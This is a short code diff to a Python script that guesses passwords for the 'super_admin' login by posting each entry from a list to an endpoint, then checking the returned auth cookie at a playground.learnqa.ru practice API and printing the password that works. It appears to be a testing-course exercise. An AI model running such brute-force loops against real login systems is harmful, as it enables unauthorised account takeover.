@@ -19,14 +19,12 @@ for pswrd in list_of_passwords:
     params = {"login": "super_admin", "password": pswrd}
     response = requests.post(url, data=params)
 
-    print('password:', pswrd)
-    print('cookie:', dict(response.cookies)['auth_cookie'])
-
     url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
 
     params_check = {"auth_cookie": dict(response.cookies)['auth_cookie']}
 
-    response_check = requests.post(url_check, data=params_check)
+    response_check = requests.post(url_check, cookies=params_check)
 
     if response_check.text == "You are authorized":
-        print('response:', response_check.text)
+        print('response:', response_check.text, 'password:', pswrd)
+
